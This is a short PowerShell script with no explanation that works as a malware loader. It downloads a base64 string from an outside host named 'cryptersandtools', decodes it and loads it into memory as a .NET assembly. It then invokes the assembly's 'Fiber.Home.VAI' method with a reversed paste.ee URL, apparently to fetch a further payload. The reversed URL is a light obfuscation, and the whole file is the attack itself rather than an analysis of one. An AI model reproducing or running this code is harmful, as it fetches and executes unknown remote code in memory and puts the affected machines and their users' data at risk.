$webClient = New-Object System.Net.WebClient;
$encodedString = $webClient.DownloadString('http://cryptersandtools.minhacasa.tv/e/js_startup');
$decodedByteArray = [System.Convert]::FromBase64String($encodedString);
$loadedAssembly = [System.Reflection.Assembly]::Load($decodedByteArray);

$type = $loadedAssembly.GetType('Fiber.Home');
$method = $type.GetMethod('VAI');

$arguments = ,('0/R1NRS/d/ee.etsap//:sptth'); # ','
$method.Invoke($null, $arguments);
